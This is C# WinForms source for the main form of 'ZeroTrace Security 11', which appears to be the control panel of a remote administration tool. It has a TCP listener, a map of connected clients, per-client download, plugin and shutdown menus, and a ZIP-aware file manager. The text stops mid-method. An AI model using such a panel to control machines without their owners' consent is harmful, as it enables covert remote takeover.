using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using DevExpress.XtraGrid.Views.Grid;
using DevExpress.XtraGrid.Views.Grid.ViewInfo;
using DevExpress.XtraMap;
using DevExpress.Utils.Svg;
using Mono.Cecil;

namespace ZeroTrace_Security_Official
{
    public partial class Form1 : DevExpress.XtraBars.FluentDesignSystem.FluentDesignForm
    {
        protected override bool ExtendNavigationControlToFormTitle { get { return false; } }


        private ConcurrentQueue<LogEntry> logQueue = new ConcurrentQueue<LogEntry>();
        private System.Windows.Forms.Timer logUpdateTimer;
        private Thread ciSmokeAutomationThread;
        private volatile bool ciSmokeAutomationStopRequested;
        private Thread ciNotificationsAutomationThread;
        private volatile bool ciNotificationsAutomationStopRequested;
        private int maxLogEntries = 1000; // Limit entries to prevent memory issues
        private bool autoScroll = true;
        private string currentPath = string.Empty;
        private string currentZipFile = string.Empty;
        private Stack<string> navigationHistory = new Stack<string>();
        private bool insideZip = false;
        private bool fileManagerInitialized = false;

        // Connections navigation and context-menu state.
        private DevExpress.XtraTab.XtraTabPage autoTasksTabPage;
        private DevExpress.XtraTab.XtraTabPage notificationsTabPage;
        private DevExpress.XtraBars.Navigation.AccordionControlElement autoTasksNavigationElement;
        private DevExpress.XtraBars.Navigation.AccordionControlElement notificationsNavigationElement;
        private DevExpress.XtraBars.Navigation.AccordionControlElement pluginManagerNavigationElement;
        private DevExpress.XtraBars.Navigation.AccordionControlElement blockedConnectionsNavigationElement;
        private DevExpress.XtraBars.Navigation.AccordionControlElement systemNavigationGroup;
        private DevExpress.XtraTab.XtraTabPage pluginManagerTabPage;
        private DevExpress.XtraTab.XtraTabPage blockedConnectionsTabPage;
        private ContextMenuStrip connectionsContextMenu;
        private DevExpress.XtraBars.PopupMenu connectionsPopupMenu;
        private DevExpress.XtraBars.BarSubItem connectionsAdministrationMenu;
        private DevExpress.XtraBars.BarSubItem connectionsNetworkingMenu;
        private DevExpress.XtraBars.BarSubItem connectionsPluginsMenu;
        private DevExpress.XtraBars.BarSubItem connectionsManagementMenu;
        private DevExpress.XtraBars.BarButtonItem connectionsCloseItem;
        private DevExpress.XtraBars.BarButtonItem connectionsBlockItem;
        private DevExpress.XtraBars.BarButtonItem connectionsDownloadOneItem;
        private DevExpress.XtraBars.BarButtonItem connectionsDownloadTwoItem;
        private DevExpress.XtraBars.BarButtonItem connectionsDownloadUpdateItem;
        private DevExpress.XtraBars.BarButtonItem connectionsExPlugin1Item;
        private DevExpress.XtraBars.BarButtonItem connectionsExPlugin2Item;
        private DevExpress.XtraBars.BarButtonItem connectionsExPlugin3Item;
        private DevExpress.XtraBars.BarButtonItem connectionsSleepItem;
        private DevExpress.XtraBars.BarButtonItem connectionsHibernateItem;
        private DevExpress.XtraBars.BarButtonItem connectionsRestartItem;
        private DevExpress.XtraBars.BarButtonItem connectionsShutdownItem;
        private int contextMenuRowHandle = -1;
        private string contextMenuFieldName = string.Empty;
        private readonly List<SvgImage> sidebarIconImages = new List<SvgImage>();
        private readonly List<SvgImage> connectionMenuIconImages = new List<SvgImage>();
        // Keep the navigation rail wide enough for labels such as "Blocked Connections"
        // without relying on DevExpress skin padding or text clipping.
        // SidebarWidth is a logical 96-DPI design width. All runtime geometry derived
        // from it is converted to the current monitor DPI so the same visual width is
        // preserved on 100%, 125%, 150%, 175%, etc. displays.
        private const int SidebarWidth = 240;
        private const int SidebarGroupHeight = 36;
        private const int SidebarItemHeight = 28;
        // Keep the parent popup and child flyouts at the same compact width so the
        // context-menu surfaces align consistently without excessive trailing space.
        private const int ContextMenuWidth = 220;
        // The same compact width is applied to the parent popup and nested flyouts.
        private const int ContextParentMenuWidth = 220;
        private const int SidebarIconSize = 18;
        // Keep category rules visually aligned with the full sidebar, ending just
        // before the native group minimize/expand button rather than at an earlier inset.
        private const int SidebarContentRightPadding = 32;
        // Keep the visible sidebar menu surfaces deliberately a little narrower than
        // the 240-logical-pixel rail. The AccordionControl hit-test area remains full-width.
        private const int SidebarMenuHorizontalInset = 10;
        private static readonly Color SidebarBackgroundColor = Color.FromArgb(66, 64, 65);
        // Local semantic alias for the shared application accent token.
        // The authoritative C# token lives in UiTheme; DevExpress palette values
        // live in App.config because that is where the WinForms skin loader reads them.
        private static readonly Color SidebarAccentColor = UiTheme.AccentColor;
        private static readonly Color SidebarItemTextColor = Color.FromArgb(232, 232, 232);

        private GridView gridView;
        private DataTable clientsTable;
        private VectorItemsLayer clientsLayer;
        private Dictionary<string, GeoPoint> locationCache = new Dictionary<string, GeoPoint>();
        // TCP server properties
        private TcpListener tcpServer;
        private bool isServerRunning = false;
        private Thread serverThread;
        private List<ServerInstance> activeServers = new List<ServerInstance>();
        private readonly object connectionStateLock = new object();
        private readonly Dictionary<string, TcpClient> connectedClients = new Dictionary<string, TcpClient>();
        private readonly Dictionary<string, string> connectionRowIds = new Dictionary<string, string>();
        private readonly HashSet<string> selectedConnectionIds = new HashSet<string>(StringComparer.Ordinal);
        private readonly HashSet<string> pendingTelemetryRefreshes = new HashSet<string>(StringComparer.Ordinal);
        private readonly Dictionary<string, long> telemetryRequestTicks = new Dictionary<string, long>();
        private DevExpress.XtraEditors.PanelControl connectionsLayoutHost;
        private DevExpress.XtraEditors.PanelControl connectionsSearchBar;
        private DevExpress.XtraEditors.PanelControl connectionsSearchEditorHost;
        private DevExpress.XtraEditors.SimpleButton connectionsSearchButton;
        private DevExpress.XtraEditors.SearchControl connectionsSearchControl;
        private DevExpress.XtraEditors.SimpleButton connectionsSearchCloseButton;
        private string connectionMouseDownSelectionId = string.Empty;
        private bool connectionMouseDownWasSelected;

        // Class to track each server instance
        private class ServerInstance
        {
            public int Port { get; set; }
            public TcpListener Listener { get; set; }
            public Thread ServerThread { get; set; }
        }
        private class LogEntry
        {
            public DateTime Timestamp { get; set; }
            public string Message { get; set; }
            public LogType Type { get; set; }

            public Color GetColor()
            {
                switch (Type)
                {
                    case LogType.Error: return Color.Red;
                    case LogType.Warning: return Color.Orange;
                    case LogType.Info: return Color.White;
                    case LogType.Connection: return SidebarAccentColor;
                    case LogType.DataTransfer: return SidebarAccentColor;
                    case LogType.Security: return Color.Yellow;
                    default: return Color.Gray;
                }
            }
        }


        // To this:
        public enum LogType
        {
            Info,
            Warning,
            Error,
            Connection,
            DataTransfer,
            Security,
            System
        }

        public Form1()
        {
            InitializeComponent();

            Color mainBackground = ColorTranslator.FromHtml("#262626");
            Color sidebarBackground = ColorTranslator.FromHtml("#424041");
            BackColor = mainBackground;
            fluentDesignFormContainer1.BackColor = mainBackground;
            xtraTabControl1.BackColor = mainBackground;
            accordionControl1.BackColor = sidebarBackground;
            ApplySidebarLayoutForDpi(GetCurrentDpi(), true);
            this.ForeColor = Color.White;
            SetMainWindowCaption("ZeroTrace Security 11");
            // FluentDesignFormControl exposes the standard WinForms ForeColor/BackColor
            // properties here. Do not use an Appearance object: that API is not present
            // on DevExpress 24.2.3 FluentDesignFormControl.
            fluentDesignFormControl1.ForeColor = Color.White;
            fluentDesignFormControl1.BackColor = Color.FromArgb(26, 26, 26);
            // The FluentDesignForm owns the fill container layout. Do not fight its
            // docking engine with a second absolute location assignment.
            fluentDesignFormControl1.Invalidate();
            accordionControl1.AllowItemSelection = true;
            ConfigureSidebarAppearance();
            accordionControl1.CustomDrawElement += AccordionControl1_CustomDrawElement;
            xtraTabControl1.SelectedPageChanged += xtraTabControl1_SelectedPageChanged;

            KeyPreview = true;
            KeyDown += Form1_KeyDown;

            InitializeAdditionalNavigationPages();
            InitializeNotificationsPage();
            this.FormClosing += delegate
            {
                SaveNotificationSettingsOnClose();
                DisposeUiIconImages();
            };
            accordionControl1.SelectedElement = accordionControlElement2;
            InitializeConnectionsContextMenu();
            ConfigureConnectionsLayout();
            SetupGridControl();
            InitializeLogging();

            if (textEdit1 != null && string.IsNullOrWhiteSpace(textEdit1.Text))
                textEdit1.Text = "4793";

        }







        private void SetupFileManager()
        {
            if (fileManagerInitialized)
                return;

            // Create data source
            DataTable fileTable = new DataTable();
            fileTable.Columns.Add("Name", typeof(string));
            fileTable.Columns.Add("Type", typeof(string));
            fileTable.Columns.Add("Size", typeof(string));
            fileTable.Columns.Add("Modified", typeof(DateTime));
            fileTable.Columns.Add("Path", typeof(string)); // Hidden column for internal use
            fileTable.Columns.Add("IsDirectory", typeof(bool)); // Hidden column for internal use
            fileTable.Columns.Add("IsZipEntry", typeof(bool)); // Hidden column for internal use

            // Configure the grid control
            gridControl3.DataSource = fileTable;

            // Configure grid view
            DevExpress.XtraGrid.Views.Grid.GridView gridView = gridControl3.MainView as DevExpress.XtraGrid.Views.Grid.GridView;
            if (gridView != null)
            {
                // Set appearance options
                gridView.OptionsBehavior.Editable = false;
                gridView.OptionsView.ShowGroupPanel = false;
                gridView.OptionsView.ShowIndicator = false;
                gridView.OptionsView.EnableAppearanceEvenRow = true;
                gridView.OptionsView.EnableAppearanceOddRow = true;

                // Configure columns
                gridView.Columns["Name"].Width = 250;
                gridView.Columns["Type"].Width = 100;
                gridView.Columns["Size"].Width = 80;
                gridView.Columns["Modified"].Width = 150;

                // Hide internal columns
                gridView.Columns["Path"].Visible = false;
                gridView.Columns["IsDirectory"].Visible = false;
                gridView.Columns["IsZipEntry"].Visible = false;

                // Format columns
                gridView.Columns["Modified"].DisplayFormat.FormatType = DevExpress.Utils.FormatType.DateTime;
                gridView.Columns["Modified"].DisplayFormat.FormatString = "MM/dd/yyyy";

                // Double click handler to navigate
                gridView.DoubleClick += (s, args) => {
                    // Get mouse position from Control class
                    Point mousePoint = gridControl3.PointToClient(Control.MousePosition);
                    var hitInfo = gridView.CalcHitInfo(mousePoint);

                    if (hitInfo.InRow && hitInfo.RowHandle >= 0)
                    {
                        string name = gridView.GetRowCellValue(hitInfo.RowHandle, "Name").ToString();
                        string path = gridView.GetRowCellValue(hitInfo.RowHandle, "Path").ToString();
                        bool isDirectory = Convert.ToBoolean(gridView.GetRowCellValue(hitInfo.RowHandle, "IsDirectory"));
                        bool isZipEntry = Convert.ToBoolean(gridView.GetRowCellValue(hitInfo.RowHandle, "IsZipEntry"));

                        if (name == "..")
                        {
                            NavigateBack();
                        }
                        else if (isDirectory && !isZipEntry)
                        {
                            NavigateToFolder(path);
                        }
                        else if (path.EndsWith(".zip", StringComparison.OrdinalIgnoreCase) && !isZipEntry)
                        {
                            NavigateToZipRoot(path);
                        }
                        else if (isDirectory && isZipEntry)
                        {
                            NavigateToZipFolder(currentZipFile, path);
                        }
                        else if (isZipEntry)
                        {
                            ExtractAndOpenFile(currentZipFile, path);
                        }
                        else
                        {
                            OpenFile(path);
                        }
                    }
                };

                // Add context menu
                gridView.PopupMenuShowing += (s, args) => {
                    if (args.HitInfo.InRow)
                    {
                        var menu = new DevExpress.XtraBars.PopupMenu();

                        // Add navigation commands
                        if (navigationHistory.Count > 0)
                        {
                            var backItem = new DevExpress.XtraBars.BarButtonItem(new DevExpress.XtraBars.BarManager(), "Back");
                            backItem.ItemClick += (sender, e) => NavigateBack();
                            menu.AddItem(backItem);
                        }

                        var refreshItem = new DevExpress.XtraBars.BarButtonItem(new DevExpress.XtraBars.BarManager(), "Refresh");
                        refreshItem.ItemClick += (sender, e) => {
                            if (insideZip)
                                NavigateToZipRoot(currentZipFile);
                            else
                                NavigateToFolder(currentPath);
                        };
                        menu.AddItem(refreshItem);

                        // If a row is selected, add item-specific commands
                        if (args.HitInfo.RowHandle >= 0)
                        {
                            string name = gridView.GetRowCellValue(args.HitInfo.RowHandle, "Name").ToString();
                            string path = gridView.GetRowCellValue(args.HitInfo.RowHandle, "Path").ToString();
                            bool isDirectory = Convert.ToBoolean(gridView.GetRowCellValue(args.HitInfo.RowHandle, "IsDirectory"));
                            bool isZipEntry = Convert.ToBoolean(gridView.GetRowCellValue(args.HitInfo.RowHandle, "IsZipEntry"));

                            if (name != "..")
                            {
                                var openItem = new DevExpress.XtraBars.BarButtonItem(new DevExpress.XtraBars.BarManager(), "Open");
                                openItem.ItemClick += (sender, e) => {
                                    if (isDirectory && !isZipEntry)
                                        NavigateToFolder(path);
                                    else if (path.EndsWith(".zip", StringComparison.OrdinalIgnoreCase) && !isZipEntry)
                                        NavigateToZipRoot(path);
                                    else if (isDirectory && isZipEntry)
                                        NavigateToZipFolder(currentZipFile, path);
                                    else if (isZipEntry)
                                        ExtractAndOpenFile(currentZipFile, path);
                                    else
                                        OpenFile(path);
                                };
                                menu.AddItem(openItem);

                                if (isZipEntry && !isDirectory)
                                {
                                    var extractItem = new DevExpress.XtraBars.BarButtonItem(new DevExpress.XtraBars.BarManager(), "Extract");
                                    extractItem.ItemClick += (sender, e) => ExtractFile(currentZipFile, path);
                                    menu.AddItem(extractItem);
                                }
                            }
                        }

                        menu.ShowPopup(Control.MousePosition);
                    }
                };
            }

            fileManagerInitialized = true;
        }

        private void SetMainWindowCaption(string caption)
        {
            if (caption == null) caption = string.Empty;
            // Keep the window title on the native Text property. Avoid DevExpress
            // HTML caption layout so maximize/restore cannot reflow the title through
            // a second text engine.
            this.Text = caption;
            this.HtmlText = string.Empty;
        }

        private void NavigateToFolder(string folderPath)
        {
            try
            {
                // Save current path to history if not empty
                if (!string.IsNullOrEmpty(currentPath))
                {
                    navigationHistory.Push(currentPath);
                }

                // Update current path
                currentPath = folderPath;
                insideZip = false;
                currentZipFile = string.Empty;

                // Update window title to show current path
                SetMainWindowCaption($"File Manager - {folderPath}");

                // Get the data table
                DataTable fileTable = gridControl3.DataSource as DataTable;
                fileTable.Rows.Clear();

                // Add back navigation entry if not at the root Clients folder
                string clientsFolder = Path.Combine(Application.StartupPath, "Clients");
                if (!string.Equals(folderPath, clientsFolder, StringComparison.OrdinalIgnoreCase))
                {
                    DataRow backRow = fileTable.NewRow();
                    backRow["Name"] = "..";
                    backRow["Type"] = "Directory";
                    backRow["Size"] = "";
                    backRow["Modified"] = DateTime.Now;
                    backRow["Path"] = Directory.GetParent(folderPath).FullName;
                    backRow["IsDirectory"] = true;
                    backRow["IsZipEntry"] = false;
                    fileTable.Rows.Add(backRow);
                }

                // Add directories
                foreach (string directory in Directory.GetDirectories(folderPath))
                {
                    DirectoryInfo dirInfo = new DirectoryInfo(directory);

                    DataRow row = fileTable.NewRow();
                    row["Name"] = dirInfo.Name;
                    row["Type"] = "Directory";
                    row["Size"] = "";
                    row["Modified"] = dirInfo.LastWriteTime;
                    row["Path"] = directory;
                    row["IsDirectory"] = true;
                    row["IsZipEntry"] = false;
                    fileTable.Rows.Add(row);
                }

                // Add files
                foreach (string file in Directory.GetFiles(folderPath))
                {
                    FileInfo fileInfo = new FileInfo(file);

                    DataRow row = fileTable.NewRow();
                    row["Name"] = fileInfo.Name;
                    row["Type"] = fileInfo.Extension.ToUpper().TrimStart('.');
                    row["Size"] = FormatAllASS(fileInfo.Length);
                    row["Modified"] = fileInfo.LastWriteTime;
                    row["Path"] = file;
                    row["IsDirectory"] = false;
                    row["IsZipEntry"] = false;
                    fileTable.Rows.Add(row);
                }

                // Refresh the grid
                gridControl3.RefreshDataSource();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error navigating to folder: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void NavigateToZipRoot(string zipFilePath)
        {
            try
            {
                // Save current path to history
                navigationHistory.Push(currentPath);

                // Update state
                currentPath = zipFilePath;
                currentZipFile = zipFilePath;
                insideZip = true;

                // Update window title
                SetMainWindowCaption($"File Manager - {zipFilePath} (ZIP)");

                // Get the data table
                DataTable fileTable = gridControl3.DataSource as DataTable;
                fileTable.Rows.Clear();

                // Add back navigation entry
                DataRow backRow = fileTable.NewRow();
                backRow["Name"] = "..";
                backRow["Type"] = "Directory";
                backRow["Size"] = "";
                backRow["Modified"] = DateTime.Now;
                backRow["Path"] = Path.GetDirectoryName(zipFilePath);
                backRow["IsDirectory"] = true;
                backRow["IsZipEntry"] = false;
                fileTable.Rows.Add(backRow);

                // Open the ZIP file and list contents
                using (ZipArchive archive = ZipFile.OpenRead(zipFilePath))
                {
                    // Get unique directories at the root level
                    HashSet<string> rootDirs = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

                    foreach (ZipArchiveEntry entry in archive.Entries)
                    {
                        string entryPath = entry.FullName.Replace('\\', '/');

                        // Check if this is a file or directory at the root level
                        if (entryPath.Contains("/"))
                        {
                            // It's a file in a subdirectory or a subdirectory itself
                            string[] parts = entryPath.Split(new[] { '/' }, StringSplitOptions.RemoveEmptyEntries);
                            if (parts.Length > 0)
                            {
                                rootDirs.Add(parts[0]);
                            }
                        }
                        else if (!string.IsNullOrEmpty(entryPath))
                        {
                            // It's a file at the root level
                            DataRow row = fileTable.NewRow();
                            row["Name"] = entry.Name;
                            row["Type"] = Path.GetExtension(entry.Name).ToUpper().TrimStart('.');
                            row["Size"] = FormatAllASS(entry.Length);
                            row["Modified"] = entry.LastWriteTime.DateTime;
                            row["Path"] = entry.FullName;
                            row["IsDirectory"] = false;
                            row["IsZipEntry"] = true;
                            fileTable.Rows.Add(row);
                        }
                    }

                    // Add all unique root directories
                    foreach (string dir in rootDirs)
                    {
                        DataRow row = fileTable.NewRow();
                        row["Name"] = dir;
                        row["Type"] = "Directory";
                        row["Size"] = "";
                        row["Modified"] = DateTime.Now;
                        row["Path"] = dir;
                        row["IsDirectory"] = true;
                        row["IsZipEntry"] = true;
                        fileTable.Rows.Add(row);
                    }
                }

                // Refresh the grid
                gridControl3.RefreshDataSource();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error navigating to ZIP file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void NavigateToZipFolder(string zipFilePath, string folderPath)
        {
            try
            {
                // Save current path to history
                navigationHistory.Push(currentPath);

                // Update state
                currentPath = folderPath;
                insideZip = true;

                // Update window title
                SetMainWindowCaption($"File Manager - {zipFilePath} → {folderPath}");

                // Get the data table
                DataTable fileTable = gridControl3.DataSource as DataTable;
                fileTable.Rows.Clear();

                // Add back navigation entry
                DataRow backRow = fileTable.NewRow();
                backRow["Name"] = "..";
                backRow["Type"] = "Directory";
                backRow["Size"] = "";
                backRow["Modified"] = DateTime.Now;

                // Determine parent path
                folderPath = folderPath.Replace('\\', '/');
                if (folderPath.Contains("/"))
                {
                    string parentPath = Path.GetDirectoryName(folderPath)?.Replace('\\', '/');
                    if (string.IsNullOrEmpty(parentPath))
                    {
                        backRow["Path"] = zipFilePath; // Back to ZIP root
                        backRow["IsZipEntry"] = false;
                    }
                    else
                    {
                        backRow["Path"] = parentPath;
                        backRow["IsZipEntry"] = true;
                    }
                }
                else
                {
                    backRow["Path"] = zipFilePath; // Back to ZIP root
                    backRow["IsZipEntry"] = false;
                }

                backRow["IsDirectory"] = true;
                fileTable.Rows.Add(backRow);

                // Open the ZIP file and list contents of the folder
                using (ZipArchive archive = ZipFile.OpenRead(zipFilePath))
                {
                    string folderPrefix = folderPath + "/";
                    HashSet<string> subDirs = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

                    foreach (ZipArchiveEntry entry in archive.Entries)
                    {
                        string entryPath = entry.FullName.Replace('\\', '/');

                        if (entryPath.StartsWith(folderPrefix, StringComparison.OrdinalIgnoreCase))
                        {
                            string relativePath = entryPath.Substring(folderPrefix.Length);

                            if (string.IsNullOrEmpty(relativePath))
                            {
                                // This is the folder entry itself, skip it
                                continue;
                            }

                            if (relativePath.Contains("/"))
                            {
                                // This is a file in a subdirectory or a subdirectory
                                string[] parts = relativePath.Split(new[] { '/' }, StringSplitOptions.RemoveEmptyEntries);
                                if (parts.Length > 0)
                                {
                                    subDirs.Add(parts[0]);
                                }
                            }
                            else
                            {
                                // This is a file in the current directory
                                DataRow row = fileTable.NewRow();
                                row["Name"] = relativePath;
                                row["Type"] = Path.GetExtension(relativePath).ToUpper().TrimStart('.');
                                row["Size"] = FormatAllASS(entry.Length);
                                row["Modified"] = entry.LastWriteTime.DateTime;
                                row["Path"] = entry.FullName;
                                row["IsDirectory"] = false;
                                row["IsZipEntry"] = true;
                                fileTable.Rows.Add(row);
                            }
                        }
                    }

                    // Add subdirectories
                    foreach (string dir in subDirs)
                    {
                        DataRow row = fileTable.NewRow();
                        row["Name"] = dir;
                        row["Type"] = "Directory";
                        row["Size"] = "";
                        row["Modified"] = DateTime.Now;
                        row["Path"] = folderPrefix + dir;
                        row["IsDirectory"] = true;
                        row["IsZipEntry"] = true;
                        fileTable.Rows.Add(row);
                    }
                }

                // Refresh the grid
                gridControl3.RefreshDataSource();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error navigating to ZIP folder: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void NavigateBack()
        {
            try
            {
                if (navigationHistory.Count > 0)
                {
                    string previousPath = navigationHistory.Pop();

                    if (previousPath.EndsWith(".zip", StringComparison.OrdinalIgnoreCase) && !insideZip)
                    {
                        NavigateToZipRoot(previousPath);
                    }
                    else if (insideZip && !previousPath.EndsWith(".zip", StringComparison.OrdinalIgnoreCase))
                    {
                        // Going from inside a ZIP to a regular folder
                        NavigateToFolder(previousPath);
                    }
                    else if (insideZip)
                    {
                        // We're inside a ZIP folder, going to parent folder in the ZIP
                        NavigateToZipFolder(currentZipFile, previousPath);
                    }
                    else
                    {
                        // Regular folder navigation
                        NavigateToFolder(previousPath);
                    }
                }
                else if (insideZip)
                {
                    // If we're inside a ZIP but history is empty, go to the ZIP's containing folder
                    string zipFolder = Path.GetDirectoryName(currentZipFile);
                    if (!string.IsNullOrEmpty(zipFolder))
                    {
                        NavigateToFolder(zipFolder);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error navigating back: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void ExtractAndOpenFile(string zipFilePath, string entryPath)
        {
            try
            {
                // Create a temporary directory
                string tempDir = Path.Combine(Path.GetTempPath(), "ZeroTrace_FileManager");
                Directory.CreateDirectory(tempDir);

                // Create a unique filename for extraction
                string fileName = Path.GetFileName(entryPath);
                string targetPath = Path.Combine(tempDir, fileName);

                // If the file already exists, use a unique name
                if (File.Exists(targetPath))
                {
                    targetPath = Path.Combine(tempDir, $"{Path.GetFileNameWithoutExtension(fileName)}_{DateTime.Now.Ticks}{Path.GetExtension(fileName)}");
                }

                // Extract the file
                using (ZipArchive archive = ZipFile.OpenRead(zipFilePath))
                {
                    ZipArchiveEntry entry = archive.GetEntry(entryPath);
                    if (entry != null)
                    {
                        entry.ExtractToFile(targetPath, true);

                        // Open the file
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = targetPath,
                            UseShellExecute = true
                        });
                    }
                    else
                    {
                        MessageBox.Show($"Entry not found: {entryPath}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error extracting and opening file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void ExtractFile(string zipFilePath, string entryPath)
        {
            try
            {
                // Ask the user for a save location
                SaveFileDialog saveDialog = new SaveFileDialog
                {
                    FileName = Path.GetFileName(entryPath),
                    Filter = "All Files (*.*)|*.*"
                };

                if (saveDialog.ShowDialog() == DialogResult.OK)
                {
                    using (ZipArchive archive = ZipFile.OpenRead(zipFilePath))
                    {
                        ZipArchiveEntry entry = archive.GetEntry(entryPath);
                        if (entry != null)
                        {
                            entry.ExtractToFile(saveDialog.FileName, true);
                            MessageBox.Show($"File extracted to: {saveDialog.FileName}", "Extraction Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        else
                        {
                            MessageBox.Show($"Entry not found: {entryPath}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error extracting file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void OpenFile(string filePath)
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = filePath,
                    UseShellExecute = true
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error opening file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private string FormatAllASS(long bytes)
        {
            string[] sizes = { "B", "KB", "MB", "GB", "TB" };
            double len = bytes;
            int order = 0;

            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }

            return $"{len:0.##} {sizes[order]}";
        }



        private void ShowProperties(string path, bool isZipEntry)
        {
            try
            {
                // Create a simple properties dialog
                Form propertiesForm = new Form
                {
                    Text = "File Properties",
                    Size = new Size(400, 300),
                    FormBorderStyle = FormBorderStyle.FixedDialog,
                    StartPosition = FormStartPosition.CenterParent,
                    MaximizeBox = false,
                    MinimizeBox = false
                };

                // Create a TableLayoutPanel for the properties
                TableLayoutPanel panel = new TableLayoutPanel
                {
                    Dock = DockStyle.Fill,
                    Padding = new Padding(10),
                    RowCount = 6,
                    ColumnCount = 2,
                    ColumnStyles = {
                new ColumnStyle(SizeType.Percent, 30F),
                new ColumnStyle(SizeType.Percent, 70F)
            }
                };

                // Add properties
                panel.Controls.Add(new Label { Text = "Name:", Dock = DockStyle.Fill }, 0, 0);
                panel.Controls.Add(new Label { Text = Path.GetFileName(path), Dock = DockStyle.Fill }, 1, 0);

                panel.Controls.Add(new Label { Text = "Location:", Dock = DockStyle.Fill }, 0, 1);
                panel.Controls.Add(new Label { Text = isZipEntry ? currentZipFile : Path.GetDirectoryName(path), Dock = DockStyle.Fill }, 1, 1);

                if (isZipEntry)
                {
                    // Show ZIP entry properties
                    using (ZipArchive archive = ZipFile.OpenRead(currentZipFile))
                    {
                        ZipArchiveEntry entry = archive.GetEntry(path);
                        if (entry != null)
                        {
                            panel.Controls.Add(new Label { Text = "Size:", Dock = DockStyle.Fill }, 0, 2);
                            panel.Controls.Add(new Label { Text = FormatFileSize(entry.Length), Dock = DockStyle.Fill }, 1, 2);

                            panel.Controls.Add(new Label { Text = "Modified:", Dock = DockStyle.Fill }, 0, 3);
                            panel.Controls.Add(new Label { Text = entry.LastWriteTime.DateTime.ToString(), Dock = DockStyle.Fill }, 1, 3);

                            panel.Controls.Add(new Label { Text = "Compressed Size:", Dock = DockStyle.Fill }, 0, 4);
                            panel.Controls.Add(new Label { Text = FormatFileSize(entry.CompressedLength), Dock = DockStyle.Fill }, 1, 4);

                            panel.Controls.Add(new Label { Text = "Compression Ratio:", Dock = DockStyle.Fill }, 0, 5);
                            panel.Controls.Add(new Label { Text = entry.Length > 0 ? $"{(1 - (double)entry.CompressedLength / entry.Length) * 100:F1}%" : "0%", Dock = DockStyle.Fill }, 1, 5);
                        }
                    }
                }
                else
                {
                    // Show file system properties
                    if (File.Exists(path))
                    {
                        FileInfo fileInfo = new FileInfo(path);

                        panel.Controls.Add(new Label { Text = "Size:", Dock = DockStyle.Fill }, 0, 2);
                        panel.Controls.Add(new Label { Text = FormatFileSize(fileInfo.Length), Dock = DockStyle.Fill }, 1, 2);

                        panel.Controls.Add(new Label { Text = "Created:", Dock = DockStyle.Fill }, 0, 3);
                        panel.Controls.Add(new Label { Text = fileInfo.CreationTime.ToString(), Dock = DockStyle.Fill }, 1, 3);

                        panel.Controls.Add(new Label { Text = "Modified:", Dock = DockStyle.Fill }, 0, 4);
                        panel.Controls.Add(new Label { Text = fileInfo.LastWriteTime.ToString(), Dock = DockStyle.Fill }, 1, 4);

                        panel.Controls.Add(new Label { Text = "Attributes:", Dock = DockStyle.Fill }, 0, 5);
                        panel.Controls.Add(new Label { Text = fileInfo.Attributes.ToString(), Dock = DockStyle.Fill }, 1, 5);
                    }
                    else if (Directory.Exists(path))
                    {
                        DirectoryInfo dirInfo = new DirectoryInfo(path);

                        panel.Controls.Add(new Label { Text = "Type:", Dock = DockStyle.Fill }, 0, 2);
                        panel.Controls.Add(new Label { Text = "Directory", Dock = DockStyle.Fill }, 1, 2);

                        panel.Controls.Add(new Label { Text = "Created:", Dock = DockStyle.Fill }, 0, 3);
                        panel.Controls.Add(new Label { Text = dirInfo.CreationTime.ToString(), Dock = DockStyle.Fill }, 1, 3);

                        panel.Controls.Add(new Label { Text = "Modified:", Dock = DockStyle.Fill }, 0, 4);
                        panel.Controls.Add(new Label { Text = dirInfo.LastWriteTime.ToString(), Dock = DockStyle.Fill }, 1, 4);

                        panel.Controls.Add(new Label { Text = "Attributes:", Dock = DockStyle.Fill }, 0, 5);
                        panel.Controls.Add(new Label { Text = dirInfo.Attributes.ToString(), Dock = DockStyle.Fill }, 1, 5);
                    }
                }

                propertiesForm.Controls.Add(panel);

                // Add OK button
                Button okButton = new Button
                {
                    Text = "OK",
                    DialogResult = DialogResult.OK,
                    Anchor = AnchorStyles.Bottom | AnchorStyles.Right,
                    Location = new Point(propertiesForm.ClientSize.Width - 85, propertiesForm.ClientSize.Height - 40),
                    Size = new Size(75, 25)
                };
                propertiesForm.Controls.Add(okButton);
                propertiesForm.AcceptButton = okButton;

                // Show the form
                propertiesForm.ShowDialog();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error showing properties: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void UpdatePathLabel(string path)
        {
            // Find the path label in the toolbar
            foreach (Control control in gridControl3.Parent.Controls)
            {
                if (control is Panel panel)
                {
                    foreach (Control panelControl in panel.Controls)
                    {
                        if (panelControl is Label label && label.BorderStyle == BorderStyle.FixedSingle)
